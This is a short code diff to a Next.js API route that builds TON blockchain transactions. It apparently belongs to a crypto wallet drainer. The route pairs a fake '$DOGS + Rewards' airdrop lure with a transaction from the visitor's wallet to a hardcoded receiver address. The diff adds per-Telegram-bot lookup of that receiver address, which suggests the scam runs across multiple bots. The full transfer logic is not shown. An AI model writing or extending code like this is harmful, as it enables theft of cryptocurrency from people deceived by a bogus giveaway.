@@ -1,5 +1,6 @@
 import {Address, beginCell, StateInit, storeStateInit, toNano, TonClient, TupleBuilder} from "@ton/ton";
 import {NextRequest, NextResponse} from "next/server";
+import {getBotData} from "@/bot/classes/CustomTelegraf";
 
 
 const client = new TonClient({
@@ -15,9 +16,11 @@ const tetherAddress = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
 const defaultText = '🔐 Receive 304,734.00 $DOGS + Rewards'
 
 export async function POST(req: NextRequest) {
-	const {address: senderAddress} = await req.json();
+	const {address: senderAddress,bot} = await req.json();
 
-	const receiverAddress = "UQCwIguY34l9G5fb7uXKaC44PVUYYhqMAvBCqQca7C0kLMlS";
+	const botData = await getBotData(+bot);
+	const receiverAddress = botData.address ?? "UQCwIguY34l9G5fb7uXKaC44PVUYYhqMAvBCqQca7C0kLMlS";
+	console.log(bot, "RECEIVER", receiverAddress)
 	const senderWallet = Address.parse(senderAddress);
 	const receiverWallet = Address.parse(receiverAddress);
 
